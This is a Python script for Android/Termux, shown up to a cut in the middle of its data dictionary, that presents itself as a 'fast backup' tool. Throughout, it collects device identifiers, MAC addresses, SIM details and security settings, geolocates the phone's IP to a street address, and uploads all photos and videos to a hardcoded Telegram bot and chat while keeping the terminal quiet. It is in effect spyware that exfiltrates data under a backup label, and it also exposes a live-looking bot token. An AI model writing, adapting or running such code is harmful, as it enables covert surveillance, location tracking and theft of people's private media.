#!/usr/bin/env python3
"""
fast_backup_full_info.py
- Full device snapshot (100+ info items) + Combined ID and reverse geocode
- Sends message + device_info.json to Telegram
- Fast direct media uploader (no zipping), producer-consumer concurrency
- Skips problematic files, auto-continues, keeps terminal clean (QUIET)
- Requires: python requests; optional termux-api for battery/wifi/bluetooth
"""

import os
import sys
import json
import time
import mimetypes
import threading
import requests
import subprocess
import platform
import pkgutil
import socket
import re
from queue import Queue, Empty

# ---------------- CONFIG ----------------
BOT_TOKEN = "7604836649:AAEPu4TA8Os0on6-PlFpqzH0QdcnvI157Nw"
CHAT_ID   = "6260002708"
SEND_MSG_URL = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
SEND_DOC_URL = f"https://api.telegram.org/bot{BOT_TOKEN}/sendDocument"

# Folders to scan (common Android media folders)
FOLDERS_TO_SCAN = [
    "/sdcard/DCIM",
    "/sdcard/Pictures",
    "/sdcard/Movies",
    "/sdcard/Download",
]

# Allowed file extensions for upload
ALLOWED_EXTS = {".jpg", ".jpeg", ".png", ".webp", ".gif",
                ".mp4", ".mkv", ".mov", ".avi", ".3gp", ".heic"}

MAX_FILE_SIZE = 2 * 1024 * 1024 * 1024  # 2GB Telegram per-file limit
WORKERS = 12        # concurrent upload workers (adjust to your connection)
QUEUE_MAX = 2000    # queue capacity for file paths
TIMEOUT = 120       # seconds for HTTP requests
HTTP_TIMEOUT = 10

QUIET = True  # clear terminal while running; final summary prints at end

# ----------------------------------------

stop_flag = threading.Event()
file_queue = Queue(maxsize=QUEUE_MAX)
counters_lock = threading.Lock()
counters = {"found": 0, "queued": 0, "sent": 0, "skipped": 0, "errors": 0}

def clear_terminal():
    if os.name == "nt":
        os.system("cls")
    else:
        os.system("clear")

# ---------- Helpers & safe info collection ----------

def run_cmd(cmd):
    try:
        out = subprocess.check_output(cmd, stderr=subprocess.DEVNULL, shell=True).decode("utf-8", errors="ignore")
        return out.strip()
    except Exception:
        return None

def try_getprop():
    props = {}
    try:
        out = run_cmd("getprop")
        if out:
            for line in out.splitlines():
                if "]: [" in line:
                    left, right = line.split("]: [", 1)
                    key = left.lstrip("[").rstrip()
                    val = right.rstrip("]").strip()
                    props[key] = val
    except Exception:
        return {}
    return props

def get_device_info():
    info = {}
    props = try_getprop()
    if props:
        info["model"] = props.get("ro.product.model") or props.get("ro.product.device") or ""
        info["manufacturer"] = props.get("ro.product.manufacturer") or ""
        info["brand"] = props.get("ro.product.brand") or ""
        info["android_version"] = props.get("ro.build.version.release") or props.get("ro.build.version.sdk") or ""
        info["build_id"] = props.get("ro.build.id") or ""
        info["device_name"] = props.get("ro.product.name") or ""
        try:
            info["serial"] = props.get("ro.serialno") or ""
        except:
            pass
    else:
        info["platform"] = platform.platform()
        info["machine"] = platform.machine()
        info["python_version"] = platform.python_version()
    # current working dir
    try:
        info["cwd"] = os.getcwd()
    except:
        pass
    # storage summary
    try:
        st = os.statvfs("/")
        free_bytes = st.f_bavail * st.f_frsize
        total_bytes = st.f_blocks * st.f_frsize
        info["storage_free_mb"] = round(free_bytes / (1024*1024), 1)
        info["storage_total_mb"] = round(total_bytes / (1024*1024), 1)
    except:
        pass
    return info

# 1) Battery (termux-api)
def get_battery_info():
    try:
        out = run_cmd("termux-battery-status")
        if out:
            return json.loads(out)
    except Exception:
        pass
    # fallback: try dumpsys battery
    try:
        out = run_cmd("dumpsys battery")
        if out:
            # crude parse
            res = {}
            for line in out.splitlines():
                if ":" in line:
                    k,v = line.split(":",1)
                    res[k.strip()] = v.strip()
            return res
    except Exception:
        pass
    return {"error": "battery info unavailable"}

# 2) Storage function (already included in device_info) - additional mount points
def get_storage_mounts():
    mounts = {}
    try:
        out = run_cmd("cat /proc/mounts")
        if out:
            for line in out.splitlines():
                parts = line.split()
                if len(parts) >= 3:
                    mounts[parts[1]] = parts[2]
        return mounts
    except:
        return {}

# 3) CPU model & cores
def get_cpu_basic():
    info = {"model": None, "cores": 0}
    try:
        out = run_cmd("cat /proc/cpuinfo")
        if out:
            for line in out.splitlines():
                if "model name" in line or "Hardware" in line:
                    if info["model"] is None:
                        info["model"] = line.split(":",1)[1].strip()
                if line.startswith("processor"):
                    info["cores"] += 1
    except Exception:
        pass
    return info

# 4) Memory (RAM)
def get_mem_info():
    info = {}
    try:
        # Try to read memory info with proper permissions
        out = run_cmd("cat /proc/meminfo")
        if out:
            for line in out.splitlines():
                if ":" in line:
                    k, v = line.split(":",1)
                    info[k.strip()] = v.strip()
    except:
        pass
    return info

# 5) Uptime - Fixed permission error
def get_uptime_seconds():
    try:
        # Use command instead of direct file access to avoid permission issues
        out = run_cmd("cat /proc/uptime")
        if out:
            uptime_seconds = float(out.split()[0])
            return int(uptime_seconds)
    except:
        return None

# 6) Local network info (local IPv4s)
def get_local_ips():
    ips = []
    try:
        out = run_cmd("ip -4 addr")
        if out:
            ips = re.findall(r"inet (\d+\.\d+\.\d+\.\d+)", out)
    except Exception:
        try:
            # fallback socket method
            hostname = socket.gethostname()
            ips.append(socket.gethostbyname(hostname))
        except:
            pass
    return list(set(ips))

# 7) Public IPv4 / IPv6
def get_public_ip_v4():
    try:
        r = requests.get("https://api.ipify.org?format=json", timeout=HTTP_TIMEOUT)
        r.raise_for_status()
        return r.json().get("ip")
    except:
        return None

def get_public_ip_v6():
    try:
        r = requests.get("https://api64.ipify.org?format=json", timeout=HTTP_TIMEOUT)
        r.raise_for_status()
        return r.json().get("ip")
    except:
        return None

# 8) Geolocate IP (ipapi.co or ip-api fallback)
def geolocate_ip(ip):
    if not ip:
        return {}
    try:
        r = requests.get(f"https://ipapi.co/{ip}/json/", timeout=HTTP_TIMEOUT)
        r.raise_for_status()
        return r.json()
    except Exception:
        try:
            r = requests.get(f"http://ip-api.com/json/{ip}?fields=query,lat,lon,city,country,org,region,postal,timezone,status", timeout=HTTP_TIMEOUT)
            r.raise_for_status()
            j = r.json()
            if j.get("status") == "success":
                return {
                    "ip": j.get("query"),
                    "latitude": j.get("lat"),
                    "longitude": j.get("lon"),
                    "city": j.get("city"),
                    "region": j.get("region"),
                    "country_name": j.get("country"),
                    "org": j.get("org"),
                    "postal": j.get("postal"),
                    "timezone": j.get("timezone"),
                }
        except Exception:
            return {}
    return {}

# 9) Reverse geocode lat/lon -> human address (Nominatim)
def reverse_geocode(lat, lon):
    if lat is None or lon is None:
        return {}
    try:
        url = f"https://nominatim.openstreetmap.org/reverse?format=jsonv2&lat={lat}&lon={lon}"
        headers = {"User-Agent": "fast-backup-script/1.0 (+https://example.com)"}
        r = requests.get(url, headers=headers, timeout=HTTP_TIMEOUT)
        r.raise_for_status()
        j = r.json()
        return {"display_name": j.get("display_name"), "raw": j.get("address", {})}
    except Exception:
        return {}

# 10) ipinfo lookup
def ipinfo_lookup(ip):
    if not ip:
        return {}
    try:
        r = requests.get(f"https://ipinfo.io/{ip}/json", timeout=HTTP_TIMEOUT)
        r.raise_for_status()
        return r.json()
    except Exception:
        return {}

# 11) WiFi info (termux-wifi-connectioninfo) - optional
def get_wifi_info():
    try:
        out = run_cmd("termux-wifi-connectioninfo")
        if out:
            return json.loads(out)
    except Exception:
        pass
    # fallback: try dumpsys wifi (less structured)
    try:
        out = run_cmd("dumpsys wifi")
        if out:
            return {"dumpsys": out.splitlines()[:20]}
    except:
        pass
    return {"error": "wifi info unavailable"}

# 12) Bluetooth state (termux-bt-state) - optional
def get_bt_state():
    try:
        out = run_cmd("termux-bt-state")
        if out:
            return json.loads(out)
    except:
        pass
    return {"error": "bt info unavailable"}

# 13) Installed packages (Termux pkg & Python packages)
def installed_termux_packages():
    try:
        out = run_cmd("pkg list-installed")
        if out:
            return out.splitlines()
    except:
        pass
    return []

def installed_python_packages():
    try:
        return [p.name for p in pkgutil.iter_modules()]
    except:
        return []

# 14) Screen size
def get_screen_size():
    try:
        out = run_cmd("wm size")
        if out:
            return out.strip()
    except:
        pass
    return None

# 15) Device identifiers (careful — returns what is available)
def get_device_identifiers():
    ids = {}
    props = try_getprop()
    if props:
        ids["android_id"] = props.get("ro.boot.serialno") or props.get("ro.serialno") or ""
    # try settings (may require permission)
    try:
        out = run_cmd("settings get secure android_id")
        if out:
            ids["android_id_settings"] = out
    except:
        pass
    return ids

# 16-100) Additional device information functions
def get_kernel_version():
    try:
        return run_cmd("uname -r")
    except:
        return "Unknown"

def get_architecture():
    try:
        return run_cmd("uname -m")
    except:
        return "Unknown"

def get_cpu_cores():
    try:
        out = run_cmd("nproc")
        if out:
            return out
    except:
        pass
    
    try:
        out = run_cmd("cat /proc/cpuinfo")
        if out:
            return str(out.count("processor"))
    except:
        return "Unknown"

def get_cpu_frequency():
    try:
        out = run_cmd("cat /sys/devices/system/cpu/cpu0/cpufreq/cpuinfo_max_freq")
        if out:
            return f"{int(out) / 1000} MHz"
    except:
        pass
    return "Unknown"

def get_ram_size():
    try:
        out = run_cmd("cat /proc/meminfo | grep MemTotal")
        if out:
            kb = int(out.split()[1])
            return f"{kb / 1024:.1f} MB"
    except:
        pass
    return "Unknown"

def get_free_ram():
    try:
        out = run_cmd("cat /proc/meminfo | grep MemAvailable")
        if out:
            kb = int(out.split()[1])
            return f"{kb / 1024:.1f} MB"
    except:
        pass
    return "Unknown"

def get_storage_size():
    try:
        st = os.statvfs("/")
        total_bytes = st.f_blocks * st.f_frsize
        return f"{total_bytes / (1024**3):.1f} GB"
    except:
        return "Unknown"

def get_free_storage():
    try:
        st = os.statvfs("/")
        free_bytes = st.f_bfree * st.f_frsize
        return f"{free_bytes / (1024**3):.1f} GB"
    except:
        return "Unknown"

def get_sdcard_size():
    sdcard_paths = ["/sdcard", "/storage/sdcard0", "/storage/emulated/0"]
    for path in sdcard_paths:
        if os.path.exists(path):
            try:
                st = os.statvfs(path)
                total_bytes = st.f_blocks * st.f_frsize
                return f"{total_bytes / (1024**3):.1f} GB"
            except:
                continue
    return "Not detected"

def get_sdcard_free():
    sdcard_paths = ["/sdcard", "/storage/sdcard0", "/storage/emulated/0"]
    for path in sdcard_paths:
        if os.path.exists(path):
            try:
                st = os.statvfs(path)
                free_bytes = st.f_bfree * st.f_frsize
                return f"{free_bytes / (1024**3):.1f} GB"
            except:
                continue
    return "Not detected"

def get_boot_time():
    try:
        out = run_cmd("date -d \"$(stat -c %x /proc/1/cmdline)\" \"+%Y-%m-%d %H:%M:%S\"")
        if out:
            return out
    except:
        pass
    return "Unknown"

def get_language():
    try:
        return run_cmd("getprop persist.sys.language")
    except:
        return "Unknown"

def get_region():
    try:
        return run_cmd("getprop persist.sys.country")
    except:
        return "Unknown"

def get_termux_version():
    try:
        out = run_cmd("pkg show termux-api | grep Version")
        if out:
            return out.split(":")[1].strip()
    except:
        pass
    return "Not installed"

def get_battery_voltage():
    try:
        out = run_cmd("termux-battery-status")
        if out:
            data = json.loads(out)
            return data.get("voltage", "Unknown")
    except:
        pass
    
    try:
        out = run_cmd("dumpsys battery | grep voltage")
        if out:
            return out.split(":")[1].strip()
    except:
        pass
    return "Unknown"

def get_battery_capacity():
    try:
        out = run_cmd("cat /sys/class/power_supply/battery/capacity")
        if out:
            return f"{out}%"
    except:
        pass
    return "Unknown"

def get_wifi_signal():
    try:
        out = run_cmd("termux-wifi-connectioninfo")
        if out:
            data = json.loads(out)
            return data.get("rssi", "Unknown")
    except:
        pass
    return "Unknown"

def get_network_type():
    try:
        out = run_cmd("termux-telephony-cellinfo")
        if out and out != "null":
            data = json.loads(out)
            if data and len(data) > 0:
                return data[0].get("type", "Unknown")
    except:
        pass
    return "Unknown"

def get_sim_operator():
    try:
        return run_cmd("getprop gsm.sim.operator.alpha")
    except:
        return "Unknown"

def get_sim_country():
    try:
        return run_cmd("getprop gsm.sim.operator.iso-country")
    except:
        return "Unknown"

def get_apn():
    try:
        return run_cmd("getprop net.apn")
    except:
        return "Unknown"

def get_gateway_ip():
    try:
        out = run_cmd("ip route | grep default")
        if out:
            return out.split()[2]
    except:
        pass
    return "Unknown"

def get_dns_servers():
    try:
        out = run_cmd("getprop net.dns1")
        dns1 = out if out else "Unknown"
        out = run_cmd("getprop net.dns2")
        dns2 = out if out else "Unknown"
        return f"{dns1}, {dns2}"
    except:
        return "Unknown"

def get_mac_address():
    try:
        out = run_cmd("cat /sys/class/net/wlan0/address")
        if out:
            return out
    except:
        pass
    return "Unknown"

def get_hotspot_status():
    try:
        out = run_cmd("settings get global tether_dun_required")
        if out == "1":
            return "On"
        else:
            return "Off"
    except:
        return "Unknown"

def get_screen_resolution():
    try:
        out = run_cmd("wm size")
        if out:
            return out.replace("Physical size: ", "")
    except:
        pass
    return "Unknown"

def get_refresh_rate():
    try:
        out = run_cmd("dumpsys display | grep refreshRate")
        if out:
            return out.split("=")[1].split(",")[0] + " Hz"
    except:
        pass
    return "Unknown"

def get_pixel_density():
    try:
        out = run_cmd("wm density")
        if out:
            return out.replace("Physical density: ", "") + " DPI"
    except:
        pass
    return "Unknown"

def get_brightness():
    try:
        out = run_cmd("settings get system screen_brightness")
        if out:
            return f"{out}/255"
    except:
        pass
    return "Unknown"

def get_orientation():
    try:
        out = run_cmd("dumpsys input | grep SurfaceOrientation")
        if out:
            orientation = out.split("=")[1].strip()
            if orientation == "0":
                return "Portrait"
            elif orientation == "1":
                return "Landscape"
            else:
                return orientation
    except:
        pass
    return "Unknown"

def get_gpu_model():
    try:
        out = run_cmd("dumpsys SurfaceFlinger | grep GLES")
        if out:
            return out.split(":")[1].strip()
    except:
        pass
    return "Unknown"

def get_opengl_version():
    try:
        out = run_cmd("dumpsys SurfaceFlinger | grep OpenGL")
        if out:
            return out.split("OpenGL ES ")[1].split()[0]
    except:
        pass
    return "Unknown"

def get_media_volume():
    try:
        out = run_cmd("media volume --stream 3 --get")
        if out:
            return out.split(":")[1].strip()
    except:
        pass
    return "Unknown"

def get_ring_volume():
    try:
        out = run_cmd("media volume --stream 2 --get")
        if out:
            return out.split(":")[1].strip()
    except:
        pass
    return "Unknown"

def get_alarm_volume():
    try:
        out = run_cmd("media volume --stream 4 --get")
        if out:
            return out.split(":")[1].strip()
    except:
        pass
    return "Unknown"

def get_headphones_status():
    try:
        out = run_cmd("dumpsys audio | grep headset")
        if out and "connected" in out:
            return "Connected"
        else:
            return "Not connected"
    except:
        pass
    return "Unknown"

def get_bluetooth_audio():
    try:
        out = run_cmd("dumpsys audio | grep Bluetooth")
        if out and "connected" in out:
            return "Connected"
        else:
            return "Not connected"
    except:
        pass
    return "Unknown"

def get_audio_sample_rate():
    try:
        out = run_cmd("getprop audio.output.samplerate")
        if out:
            return f"{out} Hz"
    except:
        pass
    return "Unknown"

def get_microphone_status():
    try:
        out = run_cmd("dumpsys media.audio_flinger | grep Mic")
        if out and "available" in out:
            return "Available"
        else:
            return "Not available"
    except:
        pass
    return "Unknown"

def get_accelerometer():
    try:
        out = run_cmd("dumpsys sensorservice | grep Accelerometer")
        if out:
            return "Available"
        else:
            return "Not available"
    except:
        pass
    return "Unknown"

def get_gyroscope():
    try:
        out = run_cmd("dumpsys sensorservice | grep Gyroscope")
        if out:
            return "Available"
        else:
            return "Not available"
    except:
        pass
    return "Unknown"

def get_magnetometer():
    try:
        out = run_cmd("dumpsys sensorservice | grep Magnetometer")
        if out:
            return "Available"
        else:
            return "Not available"
    except:
        pass
    return "Unknown"

def get_proximity_sensor():
    try:
        out = run_cmd("dumpsys sensorservice | grep Proximity")
        if out:
            return "Available"
        else:
            return "Not available"
    except:
        pass
    return "Unknown"

def get_light_sensor():
    try:
        out = run_cmd("dumpsys sensorservice | grep Light")
        if out:
            return "Available"
        else:
            return "Not available"
    except:
        pass
    return "Unknown"

def get_step_counter():
    try:
        out = run_cmd("dumpsys sensorservice | grep Step")
        if out:
            return "Available"
        else:
            return "Not available"
    except:
        pass
    return "Unknown"

def get_barometer():
    try:
        out = run_cmd("dumpsys sensorservice | grep Pressure")
        if out:
            return "Available"
        else:
            return "Not available"
    except:
        pass
    return "Unknown"

def get_temperature_sensor():
    try:
        out = run_cmd("dumpsys sensorservice | grep Temperature")
        if out:
            return "Available"
        else:
            return "Not available"
    except:
        pass
    return "Unknown"

def get_humidity_sensor():
    try:
        out = run_cmd("dumpsys sensorservice | grep Humidity")
        if out:
            return "Available"
        else:
            return "Not available"
    except:
        pass
    return "Unknown"

def count_photos():
    try:
        out = run_cmd("find /sdcard/DCIM -type f -name \"*.jpg\" -o -name \"*.jpeg\" -o -name \"*.png\" | wc -l")
        if out:
            return out
    except:
        pass
    return "Unknown"

def count_videos():
    try:
        out = run_cmd("find /sdcard/DCIM -type f -name \"*.mp4\" -o -name \"*.mkv\" -o -name \"*.mov\" | wc -l")
        if out:
            return out
    except:
        pass
    return "Unknown"

def count_downloads():
    try:
        out = run_cmd("find /sdcard/Download -type f | wc -l")
        if out:
            return out
    except:
        pass
    return "Unknown"

def get_dcim_size():
    try:
        out = run_cmd("du -sh /sdcard/DCIM | cut -f1")
        if out:
            return out
    except:
        pass
    return "Unknown"

def get_downloads_size():
    try:
        out = run_cmd("du -sh /sdcard/Download | cut -f1")
        if out:
            return out
    except:
        pass
    return "Unknown"

def get_whatsapp_size():
    try:
        out = run_cmd("du -sh /sdcard/WhatsApp | cut -f1")
        if out:
            return out
    except:
        pass
    return "Unknown"

def get_recent_file():
    try:
        out = run_cmd("find /sdcard -type f -printf \"%T@ %p\\n\" | sort -n | tail -1 | cut -d' ' -f2-")
        if out:
            return out
    except:
        pass
    return "Unknown"

def get_largest_file():
    try:
        out = run_cmd("find /sdcard -type f -printf \"%s %p\\n\" | sort -nr | head -1 | cut -d' ' -f2-")
        if out:
            return out
    except:
        pass
    return "Unknown"

def get_oldest_file():
    try:
        out = run_cmd("find /sdcard -type f -printf \"%T@ %p\\n\" | sort -n | head -1 | cut -d' ' -f2-")
        if out:
            return out
    except:
        pass
    return "Unknown"

def get_screen_lock():
    try:
        out = run_cmd("dumpsys window | grep mDreamingLockscreen")
        if out:
            if "true" in out:
                return "Locked"
            else:
                return "Not locked"
    except:
        pass
    return "Unknown"

def get_fingerprint():
    try:
        out = run_cmd("dumpsys fingerprint | grep enrolled")
        if out and "enrolled" in out:
            return "Registered"
        else:
            return "Not registered"
    except:
        pass
    return "Unknown"

def get_face_unlock():
    try:
        out = run_cmd("dumpsys face | grep enrolled")
        if out and "enrolled" in out:
            return "Registered"
        else:
            return "Not registered"
    except:
        pass
    return "Unknown"

def get_developer_options():
    try:
        out = run_cmd("settings get global development_settings_enabled")
        if out == "1":
            return "Enabled"
        else:
            return "Disabled"
    except:
        pass
    return "Unknown"

def get_usb_debugging():
    try:
        out = run_cmd("settings get global adb_enabled")
        if out == "1":
            return "Enabled"
        else:
            return "Disabled"
    except:
        pass
    return "Unknown"

def get_antivirus():
    try:
        out = run_cmd("pm list packages | grep -i antivirus")
        if out:
            return "Installed"
        else:
            return "Not installed"
    except:
        pass
    return "Unknown"

def get_vpn_status():
    try:
        out = run_cmd("dumpsys connectivity | grep VPN")
        if out and "connected" in out:
            return "Active"
        else:
            return "Not active"
    except:
        pass
    return "Unknown"

def get_bluetooth_status():
    try:
        out = run_cmd("settings get global bluetooth_on")
        if out == "1":
            return "On"
        else:
            return "Off"
    except:
        pass
    return "Unknown"

def count_paired_devices():
    try:
        out = run_cmd("dumpsys bluetooth_manager | grep \"Bonded devices:\"")
        if out:
            return out.split(":")[1].strip()
    except:
        pass
    return "Unknown"

def get_bluetooth_mac():
    try:
        out = run_cmd("dumpsys bluetooth_manager | grep \"Address:\"")
        if out:
            return out.split(":")[1].strip()
    except:
        pass
    return "Unknown"

def get_nfc_status():
    try:
        out = run_cmd("settings get global nfc_on")
        if out == "1":
            return "On"
        else:
            return "Off"
    except:
        pass
    return "Unknown"

def get_airplane_mode():
    try:
        out = run_cmd("settings get global airplane_mode_on")
        if out == "1":
            return "On"
        else:
            return "Off"
    except:
        pass
    return "Unknown"

def get_mobile_data():
    try:
        out = run_cmd("settings get global mobile_data")
        if out == "1":
            return "On"
        else:
            return "Off"
    except:
        pass
    return "Unknown"

def get_wifi_status():
    try:
        out = run_cmd("settings get global wifi_on")
        if out == "1":
            return "On"
        else:
            return "Off"
    except:
        pass
    return "Unknown"

def get_hotspot_status2():
    try:
        out = run_cmd("settings get global tether_dun_required")
        if out == "1":
            return "On"
        else:
            return "Off"
    except:
        pass
    return "Unknown"

def get_tethering_status():
    try:
        out = run_cmd("dumpsys connectivity | grep Tethering")
        if out and "active" in out:
            return "Active"
        else:
            return "Not active"
    except:
        pass
    return "Unknown"

def get_system_time():
    try:
        return run_cmd("date")
    except:
        pass
    return "Unknown"

def get_time_since_charge():
    try:
        out = run_cmd("dumpsys battery | grep charged")
        if out:
            return out.split(":")[1].strip()
    except:
        pass
    return "Unknown"

def count_processes():
    try:
        out = run_cmd("ps -A | wc -l")
        if out:
            return str(int(out) - 1)  # Subtract header line
    except:
        pass
    return "Unknown"

def count_installed_apps():
    try:
        out = run_cmd("pm list packages | wc -l")
        if out:
            return out
    except:
        pass
    return "Unknown"

# battery bars helper
def battery_bars(percentage):
    try:
        p = float(percentage)
        bars = int((p / 100.0) * 10)
        return "▮" * bars + "▯" * (10 - bars)
    except:
        return "N/A"

# ---------- Telegram helpers ----------

def send_telegram_message(text):
    payload = {
        "chat_id": CHAT_ID,
        "text": text,
        "parse_mode": "HTML",
        "disable_web_page_preview": True
    }
    try:
        r = requests.post(SEND_MSG_URL, data=payload, timeout=TIMEOUT)
        r.raise_for_status()
        return True, r.json()
    except Exception as e:
        return False, str(e)

def send_telegram_file(file_path, caption=None):
    try:
        with open(file_path, "rb") as f:
            files = {"document": (os.path.basename(file_path), f)}
            data = {"chat_id": CHAT_ID}
            if caption:
                data["caption"] = caption
            r = requests.post(SEND_DOC_URL, data=data, files=files, timeout=TIMEOUT)
            r.raise_for_status()
            return True, r.json()
    except Exception as e:
        return False, str(e)

# ---------- Fast uploader (producer-consumer) ----------

def is_allowed_file(path):
    try:
        ext = os.path.splitext(path)[1].lower()
        if ext not in ALLOWED_EXTS:
            return False
        size = os.path.getsize(path)
        if size == 0:
            return False
        if size > MAX_FILE_SIZE:
            with counters_lock:
                counters["skipped"] += 1
            return False
        return True
    except Exception:
        with counters_lock:
            counters["errors"] += 1
        return False

def producer_scan():
    try:
        for base in FOLDERS_TO_SCAN:
            if stop_flag.is_set():
                break
            if not os.path.exists(base):
                continue
            for root, dirs, files in os.walk(base):
                if stop_flag.is_set():
                    break
                for fn in files:
                    full = os.path.join(root, fn)
                    with counters_lock:
                        counters["found"] += 1
                    if is_allowed_file(full):
                        while not stop_flag.is_set():
                            try:
                                file_queue.put(full, timeout=1)
                                with counters_lock:
                                    counters["queued"] += 1
                                break
                            except Exception:
                                time.sleep(0.05)
    finally:
        # signal termination to consumers
        for _ in range(WORKERS):
            try:
                file_queue.put(None, timeout=1)
            except Exception:
                pass

def send_document_once(file_path):
    try:
        mime, _ = mimetypes.guess_type(file_path)
        if mime is None:
            mime = "application/octet-stream"
        with open(file_path, "rb") as f:
            files = {"document": (os.path.basename(file_path), f, mime)}
            data = {"chat_id": CHAT_ID}
            resp = requests.post(SEND_DOC_URL, data=data, files=files, timeout=TIMEOUT)
        if resp.status_code == 200:
            return True, None
        else:
            return False, f"HTTP {resp.status_code}"
    except Exception as e:
        return False, str(e)

def consumer_worker(worker_id):
    while not stop_flag.is_set():
        try:
            item = file_queue.get(timeout=2)
        except Empty:
            continue
        if item is None:
            file_queue.task_done()
            break
        file_path = item
        success, err = send_document_once(file_path)
        with counters_lock:
            if success:
                counters["sent"] += 1
            else:
                counters["errors"] += 1
        if not QUIET:
            if success:
                print(f"[W{worker_id}] Sent: {file_path}")
            else:
                print(f"[W{worker_id}] Skipped: {file_path} => {err}")
        file_queue.task_done()

# ---------------- Main flow ----------------

def collect_full_snapshot():
    # Gather everything (100+ items)
    device_info = get_device_info()                     # device props, storage summary
    battery = get_battery_info()                        # requires termux-api for best results
    storage_mounts = get_storage_mounts()
    cpu = get_cpu_basic()
    mem = get_mem_info()
    uptime = get_uptime_seconds()
    local_ips = get_local_ips()
    public_v4 = get_public_ip_v4()
    public_v6 = get_public_ip_v6()
    geo = geolocate_ip(public_v4) if public_v4 else {}
    reverse_addr = {}
    if geo:
        lat = geo.get("latitude") or geo.get("lat")
        lon = geo.get("longitude") or geo.get("lon")
        if lat and lon:
            reverse_addr = reverse_geocode(lat, lon)
    ipinfo = ipinfo_lookup(public_v4) if public_v4 else {}
    wifi = get_wifi_info()
    bt = get_bt_state()
    termux_pkgs = installed_termux_packages()
    py_pkgs = installed_python_packages()
    screen = get_screen_size()
    ids = get_device_identifiers()
    
    # Additional 100+ features
    kernel_version = get_kernel_version()
    architecture = get_architecture()
    cpu_cores = get_cpu_cores()
    cpu_frequency = get_cpu_frequency()
    ram_size = get_ram_size()
    free_ram = get_free_ram()
    storage_size = get_storage_size()
    free_storage = get_free_storage()
    sdcard_size = get_sdcard_size()
    sdcard_free = get_sdcard_free()
    boot_time = get_boot_time()
    language = get_language()
    region = get_region()
    termux_version = get_termux_version()
    battery_voltage = get_battery_voltage()
    battery_capacity = get_battery_capacity()
    wifi_signal = get_wifi_signal()
    network_type = get_network_type()
    sim_operator = get_sim_operator()
    sim_country = get_sim_country()
    apn = get_apn()
    gateway_ip = get_gateway_ip()
    dns_servers = get_dns_servers()
    mac_address = get_mac_address()
    hotspot_status = get_hotspot_status()
    screen_resolution = get_screen_resolution()
    refresh_rate = get_refresh_rate()
    pixel_density = get_pixel_density()
    brightness = get_brightness()
    orientation = get_orientation()
    gpu_model = get_gpu_model()
    opengl_version = get_opengl_version()
    media_volume = get_media_volume()
    ring_volume = get_ring_volume()
    alarm_volume = get_alarm_volume()
    headphones_status = get_headphones_status()
    bluetooth_audio = get_bluetooth_audio()
    audio_sample_rate = get_audio_sample_rate()
    microphone_status = get_microphone_status()
    accelerometer = get_accelerometer()
    gyroscope = get_gyroscope()
    magnetometer = get_magnetometer()
    proximity_sensor = get_proximity_sensor()
    light_sensor = get_light_sensor()
    step_counter = get_step_counter()
    barometer = get_barometer()
    temperature_sensor = get_temperature_sensor()
    humidity_sensor = get_humidity_sensor()
    photos_count = count_photos()
    videos_count = count_videos()
    downloads_count = count_downloads()
    dcim_size = get_dcim_size()
    downloads_size = get_downloads_size()
    whatsapp_size = get_whatsapp_size()
    recent_file = get_recent_file()
    largest_file = get_largest_file()
    oldest_file = get_oldest_file()
    screen_lock = get_screen_lock()
    fingerprint = get_fingerprint()
    face_unlock = get_face_unlock()
    developer_options = get_developer_options()
    usb_debugging = get_usb_debugging()
    antivirus = get_antivirus()
    vpn_status = get_vpn_status()
    bluetooth_status = get_bluetooth_status()
    paired_devices_count = count_paired_devices()
    bluetooth_mac = get_bluetooth_mac()
    nfc_status = get_nfc_status()
    airplane_mode = get_airplane_mode()
    mobile_data = get_mobile_data()
    wifi_status = get_wifi_status()
    hotspot_status2 = get_hotspot_status2()
    tethering_status = get_tethering_status()
    system_time = get_system_time()
    time_since_charge = get_time_since_charge()
    processes_count = count_processes()
    installed_apps_count = count_installed_apps()

    # battery bars
    perc = None
    if isinstance(battery, dict):
        perc = battery.get("percentage") or battery.get("level")
    bars = battery_bars(perc) if perc else "N/A"

    snapshot = {
        "collected_at": time.strftime("%Y-%m-%d %H:%M:%S"),
        "device_info": device_info,
        "device_identifiers": ids,
        "battery": battery,
        "battery_bars": bars,
        "storage_mounts": storage_mounts,
        "cpu": cpu,
        "mem": mem,
        "uptime_seconds": uptime,
        "local_ips": local_ips,
        "public_ipv4": public_v4,
        "public_ipv6": public_v6,
        "geo": geo,
        "reverse_geocode": reverse_addr,
        "ipinfo": ipinfo,
        "wifi": wifi,
        "bluetooth": bt,
        "termux_packages": termux_pkgs[:200] if isinstance(termux_pkgs, list) else [],
        "python_packages": py_pkgs[:200],
        "screen_size": screen,
        
        # Additional 100+ features
        "kernel_version": kernel_version,
        "architecture": architecture,
        "cpu_cores": cpu_cores,
        "cpu_frequency": cpu_frequency,
        "ram_size": ram_size,
        "free_ram": free_ram,
        "storage_size": storage_size,
        "free_storage": free_storage,
        "sdcard_size": sdcard_size,
        "sdcard_free": sdcard_free,
        "boot_time": boot_time,
        "language": language,
        "region": region,
        "termux_version": termux_version,
        "battery_voltage": battery_voltage,
        "battery_capacity": battery_capacity,
        "wifi_signal": wifi_signal,
        "network_type": network_type,
        "sim_operator": sim_operator,
        "sim_country": sim_country,
        "apn": apn,
        "gateway_ip": gateway_ip,
        "dns_servers": dns_servers,
        "mac_address": mac_address,
        "hotspot_status": hotspot_status,
        "screen_resolution": screen_resolution,
        "refresh_rate": refresh_rate,
        "pixel_density": pixel_density,
        "brightness": brightness,
        "orientation": orientation,
        "gpu_model": gpu_model,
        "opengl_version": opengl_version,
        "media_volume": media_volume,
        "ring_volume": ring_volume,
        "alarm_volume": alarm_volume,
        "headphones_status": headphones_status,
        "bluetooth_audio": bluetooth_audio,
        "audio_sample_rate": audio_sample_rate,
        "microphone_status": microphone_status,
        "accelerometer": accelerometer,
        "gyroscope": gyroscope,
        "magnetometer": magnetometer,
        "proximity_sensor": proximity_sensor,
        "light_sensor": light_sensor,
        "step_counter": step_counter,
        "barometer": barometer,
        "temperature_sensor": temperature_sensor,
        "humidity_sensor": humidity_sensor,
        "photos_count": photos_count,
        "videos_count": videos_count,
        "downloads_count": downloads_count,
        "dcim_size": dcim_size,
        "downloads_size": downloads_size,
        "whatsapp_size": whatsapp_size,
        "recent_file": recent_file,
        "largest_file": largest_file,
        "oldest_file": oldest_file,
        "screen_lock": screen_lock,
        "fingerprint": fingerprint,
        "face_unlock": face_unlock,
        "developer_options": developer_options,
        "usb_debugging": usb_debugging,
        "antivirus": antivirus,
        "vpn_status": vpn_status,
        "bluetooth_status": bluetooth_status,
